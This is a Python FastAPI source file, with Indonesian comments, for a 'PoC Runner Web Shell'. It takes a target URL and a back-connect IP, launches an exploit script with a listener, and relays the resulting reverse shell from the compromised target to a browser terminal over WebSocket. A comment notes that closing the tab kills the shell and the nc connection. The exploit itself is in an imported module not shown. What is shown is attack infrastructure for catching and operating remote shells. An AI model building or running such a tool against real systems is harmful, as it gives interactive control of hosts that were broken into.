from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
import asyncio
import os
import logging
from app.session_manager import session_manager

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="PoC Runner Web Shell")

# Mount static files
app.mount("/static", StaticFiles(directory="app/static"), name="static")

class AttackRequest(BaseModel):
    target_url: str
    backconnect_ip: str = "0.0.0.0"

@app.get("/")
async def get():
    """
    Serve halaman utama.
    """
    with open("app/static/index.html") as f:
        return HTMLResponse(f.read())

@app.post("/api/start")
async def start_attack(req: AttackRequest):
    """
    Endpoint untuk memulai serangan PoC.
    Membuat sesi baru, listener, dan menjalankan script PoC.
    """
    try:
        session = session_manager.create_session(req.target_url, req.backconnect_ip)
        return {
            "status": "success",
            "session_id": session.id,
            "port": session.port,
            "message": f"Listener started on port {session.port}, PoC running..."
        }
    except Exception as e:
        logger.error(f"Failed to start session: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.delete("/api/stop/{session_id}")
async def stop_session(session_id: str):
    """
    Endpoint untuk menghentikan sesi.
    """
    session = session_manager.get_session(session_id)
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    session_manager.remove_session(session_id)
    return {"status": "success", "message": "Session terminated"}

@app.websocket("/ws/{session_id}")
async def websocket_endpoint(websocket: WebSocket, session_id: str):
    """
    WebSocket endpoint untuk TTY Shell.
    Menghubungkan browser xterm.js dengan PTY listener di server.
    """
    session = session_manager.get_session(session_id)
    if not session:
        await websocket.close(code=4000) # Custom code for session not found
        return

    await websocket.accept()
    
    loop = asyncio.get_running_loop()
    
    # Fungsi callback untuk membaca dari PTY master fd dan mengirim ke WebSocket
    def read_from_pty():
        try:
            data = os.read(session.master_fd, 1024)
            if data:
                # Kirim data binary/text ke websocket
                asyncio.ensure_future(websocket.send_text(data.decode(errors='ignore')))
        except OSError:
            pass

    # Daftarkan file descriptor reader ke event loop
    loop.add_reader(session.master_fd, read_from_pty)

    try:
        while True:
            # Menerima input dari xterm.js
            data = await websocket.receive_text()
            if session.master_fd:
                # Tulis input user ke PTY master fd
                os.write(session.master_fd, data.encode())
    except WebSocketDisconnect:
        logger.info(f"WebSocket disconnected for session {session_id}")
    except Exception as e:
        logger.error(f"WebSocket error: {e}")
    finally:
        # Bersihkan reader saat koneksi putus
        if session and session.master_fd:
            loop.remove_reader(session.master_fd)
        # Opsional: Stop session jika tab ditutup? 
        # User request: "jika tabnya di close akan menutup tty shell,nc dan koneksi dari target"
        session_manager.remove_session(session_id)
